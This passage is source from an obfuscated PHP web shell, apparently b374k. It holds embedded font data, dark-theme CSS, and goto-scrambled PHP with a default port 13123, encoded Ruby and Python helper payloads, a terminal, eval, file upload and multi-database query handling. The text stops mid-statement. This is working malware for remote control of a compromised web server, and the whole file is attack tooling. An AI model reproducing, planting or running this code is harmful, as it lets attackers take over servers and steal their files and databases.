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) format('woff');
	font-weight: normal;
	font-style: normal;
}
*{
	font-family:ubuntumono;
	margin:0;
	padding:0;
	border:0;
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
	font-size:12px;
	font-weight:normal;
}
input:focus, select:focus, textarea:focus, button:focus{
	outline:none;
}
html, body{
	width:100%;
	height:100%;
	color:#999999;
}
body{
	background:#111111;
}
a{
	text-decoration:none;
	color:#999999;
}
a:hover{
	cursor:pointer;
}
p{
	padding:8px 0;
}
img{
	vertical-align:middle;
}
table{
	width:100%;
}
table td, table th{
	vertical-align:middle;
	padding:8px;
}
textarea, input, select{
	background:#222222;
	padding:8px;
	border-radius:8px;
	color:#999999;
}
textarea{
	resize:vertical;
	width:100%;
	height:300px;
	min-height:300px;
	max-width:100%;
	min-width:100%;
}
hr{
	margin:8px 0;
	border-bottom:1px dashed #222222;
}
video{
	width:50%;
	background:#222222;
	border-radius:8px;
}
h1, h2{
	background:#222222;
	border-radius:8px;
	text-align:center;
	padding:8px;
	margin-bottom:8px;
}
pre, #viewFilecontent{
	word-break:break-all;
	word-wrap:break-word;
}
pre{
	white-space:pre-wrap;	
}
#b374k{
	cursor:pointer;
}
#header{
	width:100%;
	position:fixed;
}
#headerNav{
	padding:10px 8px 6px 8px;
	background:#111111;
}
#headerNav img{
	margin:0 4px;
}
#menu{
	background:#4C6B72;
	height:26px;
}
#menu .menuitem{
	padding:7px 12px 6px 12px;
	float:left;
	height:26px;
	background:#4C6B72;
	color:#B1ADAB;
	text-shadow:1px 1px 1px #333333;
	cursor:pointer;
}
#menu .menuitem:hover, #menu .menuitemSelected{
	background:#111111;
	color:#999999;
	border-radius:8px 8px 0 0;
}
#menu .menuitemSelected{
	background:#111111;
}
#basicInfo{
	width:100%;
	padding:8px;
	border-bottom:1px solid #222222;
}
#content{
	width:100%;
	height:100%;
	padding:62px 4px 10px 4px;
}
#content .menucontent{
	clear:both;
	display:none;
	padding:8px;
}
#overlay{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	display:none;
}
#loading{
	width:64px;
	height:64px;
	background:#000000;
	border-radius:32px 0 32px 0;
	margin:auto;
	vertical-align:middle;
	box-shadow:0 0 16px #000;
}
#ulDragNDrop{
	padding:32px 0;
	text-align:center;
	background:#222222;
	border-radius:8px;
}
#form{
	display:none;
}
.box{
	min-width:50%;
	border:1px solid #222222;
	padding:8px 8px 0 8px;
	border-radius:8px;
	position:fixed;
	background:#111111;
	opacity:1;
	box-shadow:1px 1px 25px #150f0f;
	opacity:0.98;
}
.boxtitle{
	background:#4C6B72;
	color:#B1ADAB;
	border-radius:8px;
	text-align:center;
	cursor:pointer;
	text-shadow:1px 1px 1px #333333;
}
.boxtitle a, .boxtitle a:hover{
	color:#B1ADAB;
	text-shadow:1px 1px 1px #333333;
}
.boxcontent{
	padding:2px 0 2px 0;
}
.boxresult{
	padding:4px 10px 6px 10px;
	border-top:1px solid #222222;
	margin-top:4px;
	text-align:center;
}
.boxtbl{
	border:1px solid #222222;
	border-radius:8px;
	padding-bottom:8px;
}
.boxtbl td{
	vertical-align:middle;
	padding:8px 15px;
	border-bottom:1px dashed #222222;
}
.boxtbl input, .boxtbl select, .boxtbl .button{
	width:100%;
}
.boxlabel{
	text-align: center;
	border-bottom:1px solid #222222;
	padding-bottom:8px;
}
.boxclose{
	background:#222222;
	border-radius:3px;
	margin-right:8px;
	margin-top:-2px;
	padding:2px 8px;
	cursor:pointer;
}
.strong{
	color:#4C6B72;
}
.weak{
	color:#666666;
}
.button{
	min-width:120px;
	width:120px;
	margin:2px 0;
	background:#222222;
	color:#999999;
	padding:8px;
	border-radius:8px;
	display:block;
	text-align:center;
	float:left;
	cursor:pointer;
}
.button:hover, #ulDragNDrop:hover{
	box-shadow:1px 1px 5px #150f0f;
	background:#333333;
}
.floatLeft{
	float:left;
}
.floatRight{
	float:right;
}
.colFit{
	width:1px;
    white-space:nowrap;
}
.colSpan{
	width:100%;
}
.border{
	border:1px solid #222222;
	border-radius:8px;
	padding:8px;
}
.borderbottom{
	border-bottom:1px dashed #222222;
}
.borderright{
	border-right:1px dashed #222222;
}
.borderleft{
	border-left:1px dashed #222222;
}
.hr td{
	border-bottom:1px dashed #222222;
}
.cBox, .cBoxAll{
	width:10px;
	height:10px;
	border:1px solid #4C6B72;
	border-radius:5px;
	margin:auto;
	float:left;
	margin:2px 6px;
	cursor:pointer;
}
.cBoxSelected{
	background:#4C6B72;
}
.action, .actionfolder, .actiondot{
	cursor:pointer;
}
.phpError{
	padding:8px;
	margin:8px 0;
	text-align:center;
}
.dataView td, .dataView th, #viewFile td{
	vertical-align:top;
	text-align:center;
	border-bottom:1px dashed #222222;
}
.dataView th{
	border-bottom:none;
}
.dataView tbody tr:hover{
	background:#222222;
}
.dataView th{
	background:#222222;
	vertical-align:middle;
}
.dataView tfoot td{
	vertical-align:middle;
}
.dataView .col-cbox{
	width:20px;
}
.dataView .col-name, .dataView tr>td:nth-child(2){
	text-align:left;
}
.dataView .col-size, .dataView tr>td:nth-child(3){
	width:70px;
	text-align:left;
}
.dataView .col-owner{
	width:140px;
	min-width:140px;
}
.dataView .col-perms{
	width:80px;
}
.dataView .col-modified{
	width:150px;
}
.sortable th{
	cursor:pointer;
}
#viewFile td{
	text-align:left;
}
#viewFilecontent{
	padding:8px;
	border:1px solid #222222;
	border-radius:8px;
}
#terminalPrompt td{
	padding:0;
}
#terminalInput{
	background:none;
	padding:0;
	width:100%;
}
#evalAdditional{
	display:none;
}
.hl_default{
	color:#408494;
}
.hl_keyword{
	color:#cccccc;
}
.hl_string{
	color:#8EB9D1;
}
.hl_html{
	color:#aaaaaa;
}
.hl_comment{
	color:#FF7000;
}
#navigation{position:fixed;left:-16px;top:46%;}
#totop,#tobottom,#toggleBasicInfo{background:url('<?php  goto E_pd2; Iz8eR: $default_port = 13123; goto lrIPB; JxDMP: chdir(get_cwd()); goto nqPvS; F6HEG: if (!function_exists('html_safe')) { function html_safe($str) { return htmlspecialchars($str, 2 | 1); } } goto aAX7l; y_jgg: if (!function_exists('output')) { function output($str) { goto X1aQd; c1j8C: die; goto MGsXr; X1aQd: $error = @ob_get_contents(); goto ObtPq; ObtPq: @ob_end_clean(); goto oYx9m; PrcHi: header("Pragma: no-cache"); goto HiwKl; BKZEX: header("Cache-Control: no-cache"); goto PrcHi; oYx9m: header("Content-Type: text/plain"); goto BKZEX; HiwKl: echo $str; goto c1j8C; MGsXr: } } goto ssZyA; ukut3: ?></span>

			<a class='boxclose' id='logout' title='log out'>x</a>
			<a class='boxclose' id='showinfo' title='show info'>v</a>
		</div>
		<!--header info end-->

		<!--menu start-->
		<div id='menu'>
			<?php  goto JlLmd; mbzgL: $remote_addr = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ""; goto Iz8eR; dqEKI: $GLOBALS['resources']['rs_ruby'] = "tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs="; goto GmKDH; AHemz: if (!function_exists('wrap_with_quotes')) { function wrap_with_quotes($str) { return "\"" . $str . "\""; } } goto fdNuo; zoJP6: $GLOBALS['module']['eval']['id'] = "eval"; goto ek0Hv; e1irl: ?>
</script>
<!--script end-->
</body>
</html><?php  goto ApASn; VT6Ak: echo get_self(); goto HArXi; tzxqm: $GLOBALS['module']['info']['js_ontabselected'] = ""; goto CHCYS; xPGnh: $GLOBALS['resources']['rs_python'] = "rVRtb9owEP6c/IrUnYYtUlNoq010QUJtOlVbWwRM+9B2KDgHiQpOZDst/fc7JykwxNQPmxBJ7sV399w958ODVqFVa5rKFshnL381SSbdQy8xJtfdVmuemqSYcpEtW9OTT6dP1dNNl3mmjKfA18U0V5kArf1M+/oV/5l4AuObdAluHhDiJvYRw8zTCSwWVLCu69gzweYsH2Q5SCr80iUYqwIjmzgrzB9O14PQqkGpfepU7mqZ6ygwhZKe1fIqIlcQxZQ131QYbUu1zA1lHKTIYqCNwsyOPjeYW5YfCZNmsqo/nXmZ5jJawkFApCGocmaB4LN0ATKjmNhBO7bDwJISWJXtGofDm2BlQC3PB6N20Pgw+HnZa5zXVlSdl4PQiXeUel8+kqY2is5Yk3i9baGzkTAPLDTY7C8JpvZs56zkGPVavh2FVSkQz7R93DllPIYSGSmREVunAysBuam880jrUldHdSxShEQV6x1XCmcaKOAaIiUSSkT84NH7Xw/6scmIr/zZIppr63D99fZuGF70RyGrjmGgaR2hbl8emYSnOk4VnfK5yoqcthl787ENFMmOsbbh4EDG9G/zqt02IDCYpVLJP8W2iiiMF8m4RIjfFmMd2kruOohX0+gqQqliw1vu7ppj5EGSJhY9ByNeLJ1Ij7jzAEnAIzV/dutOzlkQdOwKBPP79qMLiy39yUbvJPjuWDvmh1VqED7uUyoNzZmrg2rNePWitdS/mlzfhuN6B/no7uLbZDQehv0bPILAjDVk+dp/dPd9Yp22j0yG4Y9R2L+8HPqYcadozZGhMaXkmJc/4ue225ovUqS6pGcoWOrhKkcsQODCcsvuw4Zl9mbgegFgJ7oh8L6Vehs0JeW9U90gXtcTmZQgDMTY8r3TX4/+vQBkvfR746x33t2ZkgXpIUGrOJQmVSP2ojx7D6X+V5T6v6DU7Dc="; goto bv3H7; gqzeY: ?><!doctype html>
<html>
<head>
<title><?php  goto mIXut; obRR7: if (isset($p['dbGetSupported'])) { goto x13EF; x13EF: $res = sql_get_supported(); goto iT_6R; P19JI: output($res); goto IGbUN; iT_6R: if (empty($res)) { $res = "error"; } goto P19JI; IGbUN: } elseif (isset($p['dbType']) && isset($p['dbHost']) && isset($p['dbUser']) && isset($p['dbPass']) && isset($p['dbPort'])) { goto nUEDx; VDGsK: if (!empty($res)) { output($res); } goto IdwS2; mby7i: if ($con !== false) { if (isset($p['dbQuery'])) { goto FWRiP; M4OXO: $querys = explode(";", $query); goto cLVVN; jujHp: $pagination = ""; goto EAWsY; FWRiP: $query = $p['dbQuery']; goto jujHp; EAWsY: if (isset($p['dbDB']) && isset($p['dbTable'])) { goto NCdnd; l7QiK: if ($type == 'mysql') { $query = "SELECT * FROM " . $db . "." . $table . " LIMIT " . $start . "," . $limit . ";"; } elseif ($type == 'mssql') { $query = "SELECT TOP " . $limit . " * FROM " . $db . ".." . $table . ";"; } elseif ($type == 'pgsql') { $query = "SELECT * FROM " . $db . "." . $table . " LIMIT " . $limit . " OFFSET " . $start . ";"; } elseif ($type == 'oracle') { $limit = $start + $limit; $query = "SELECT * FROM " . $db . "." . $table . " WHERE ROWNUM BETWEEN " . $start . " AND " . $limit . ";"; } elseif ($type == 'sqlite' || $type == 'sqlite3') { $query = "SELECT * FROM " . $table . " LIMIT " . $start . "," . $limit . ";"; } else { $query = ""; } goto q29Mq; ARA3L: $table = trim($p['dbTable']); goto iIOkK; iIOkK: $start = (int) isset($p['dbStart']) ? trim($p['dbStart']) : 0; goto hXFsf; NCdnd: $db = trim($p['dbDB']); goto ARA3L; q29Mq: $pagination = "Limit <input type='text' id='dbLimit' value='" . html_safe($limit) . "' style='width:50px;'>\n\t\t\t\t\t\t\t\t<span class='button' onclick=\"db_pagination('prev');\">prev</span>\n\t\t\t\t\t\t\t\t<span class='button' onclick=\"db_pagination('next');\">next</span>\n\t\t\t\t\t\t\t\t<input type='hidden' id='dbDB' value='" . html_safe($db) . "'>\n\t\t\t\t\t\t\t\t<input type='hidden' id='dbTable' value='" . html_safe($table) . "'>\n\t\t\t\t\t\t\t\t<input type='hidden' id='dbStart' value='" . html_safe($start) . "'>\n\t\t\t\t\t\t\t\t"; goto EASAP; hXFsf: $limit = (int) isset($p['dbLimit']) ? 